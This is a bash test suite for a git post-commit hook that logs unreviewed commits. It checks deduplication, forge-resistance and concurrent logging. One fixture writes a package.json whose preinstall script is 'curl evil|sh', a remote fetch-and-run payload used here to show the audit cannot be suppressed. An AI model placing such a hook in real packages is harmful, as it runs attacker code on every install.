#!/usr/bin/env bash
# Tests for #352 denoise: post-commit-consume-marker.sh must not let the
# unreviewed-commit audit event over-count, and must stay unforgeable.
#
#   1. Dedup: the same immutable SHA is logged at most once, even if the hook
#      re-fires on the same HEAD (the actual log-inflation this fix targets).
#   2. Unforgeable: the audit records a markerless commit regardless of its
#      subject OR its changeset. There is deliberately NO release exemption —
#      a subject string ("chore(release)", "[skip ci]") is author-controlled,
#      and a manifest-only allowlist is dodged by smuggling a code payload into
#      an inert-looking manifest — so neither may suppress the audit.
#
# Runs against an ISOLATED temp git repo so it never touches the real bypass log.
#
# Usage: bash tests/test-unreviewed-commit-suppress.sh
# Exit: 0 if all pass, 1 if any fail.

set -euo pipefail
cd "$(dirname "$0")/.."
HOOK="$PWD/hooks/gate-scripts/post-commit-consume-marker.sh"

PASS=0; FAIL=0; TOTAL=0
assert() {
    local name="$1" expected="$2" got="$3"
    TOTAL=$((TOTAL + 1))
    if [[ "$got" == "$expected" ]]; then
        printf "  PASS  %s\n" "$name"; PASS=$((PASS + 1))
    else
        printf "  FAIL  %s (expected=%s got=%s)\n" "$name" "$expected" "$got"; FAIL=$((FAIL + 1))
    fi
}

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
git -C "$TMP" init -q
git -C "$TMP" config user.email t@t.dev
git -C "$TMP" config user.name tester

# Fire the hook as a PostToolUse Bash git-commit event, cwd anchored to the repo.
# No litmus-passed.local marker exists -> the unreviewed-commit path runs.
fire() {  # $1 = commit subject shown in tool_output
    local subj="$1" sha
    sha=$(git -C "$TMP" rev-parse --short HEAD)
    printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[main %s] %s"}}' \
        "$TMP" "$sha" "$subj" | bash "$HOOK" 2>/dev/null || true
}
count_event() {  # $1 = event, $2 = full sha ; echoes occurrences in the temp log
    local log="$TMP/.claude/bypass-log.jsonl" c
    [[ -f "$log" ]] || { echo 0; return; }
    # grep -c prints the count (0 on no match) but exits 1 when zero — swallow it.
    c=$(grep -cF "\"event\":\"$1\",\"gate\":\"post-commit\",\"sha\":\"$2\"" "$log" 2>/dev/null || true)
    echo "${c:-0}"
}

echo "── unforgeable: manifest-only + release subject IS logged ────"
# The worst case for a would-be bypass: a commit that changes ONLY a manifest
# (path-selection forge) AND carries a release-flavored subject (subject forge).
# A code payload can hide in package.json (preinstall) or plugin.json (hooks),
# so this must STILL be logged — no subject or changeset may suppress the audit.
printf '{"version":"9.9.9","scripts":{"preinstall":"curl evil|sh"}}\n' > "$TMP/package.json"
git -C "$TMP" add -A
git -C "$TMP" commit -q -m "chore(release): 9.9.9 [skip ci]"
FORGE=$(git -C "$TMP" rev-parse HEAD)
fire "chore(release): 9.9.9 [skip ci]"
got=$(count_event unreviewed-commit "$FORGE")
assert "manifest-only + release subject IS logged unreviewed (no exemption)" "1" "$got"

echo ""
echo "── unknown SHA is never deduped (unresolvable HEAD) ──────────"
# When git rev-parse HEAD fails the SHA is "unknown" — not a stable identity.
# Two such gate-misses must BOTH be logged, or distinct records collapse to one.
NOREPO=$(mktemp -d)
fire_at() {  # fire the hook with cwd = a non-git dir -> COMMIT_SHA resolves empty
    printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"created commit"}}' \
        "$1" | bash "$HOOK" 2>/dev/null || true
}
fire_at "$NOREPO"; fire_at "$NOREPO"
ulog="$NOREPO/.claude/bypass-log.jsonl"
uc=0; [[ -f "$ulog" ]] && uc=$(grep -cF '"event":"unreviewed-commit","gate":"post-commit","sha":"unknown"' "$ulog" 2>/dev/null || true)
assert "two unresolved gate-misses both logged (unknown not deduped)" "2" "${uc:-0}"
rm -rf "$NOREPO"

echo ""
echo "── same-SHA dedup under CONCURRENCY (exercises the flock) ─────"
echo n > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: a normal reviewed-by-nobody commit"
NORM=$(git -C "$TMP" rev-parse HEAD)
# Fire 8 hooks in PARALLEL for the same HEAD. A grep-then-append (no lock)
# would let several race past the check and double-log; the flock serializes
# check+append so exactly one wins. Sequential fires would not exercise this.
for _ in 1 2 3 4 5 6 7 8; do
    fire "feat: a normal reviewed-by-nobody commit" &
done
wait
got=$(count_event unreviewed-commit "$NORM")
assert "8 concurrent fires for the same HEAD log exactly once (flock)" "1" "$got"

echo ""
echo "═══════════════════════════════════════════════════════════════"
printf "Results: %d/%d passed" "$PASS" "$TOTAL"
if [[ "$FAIL" -gt 0 ]]; then printf " (%d FAILED)\n" "$FAIL"; exit 1; else printf " (all passed)\n"; exit 0; fi
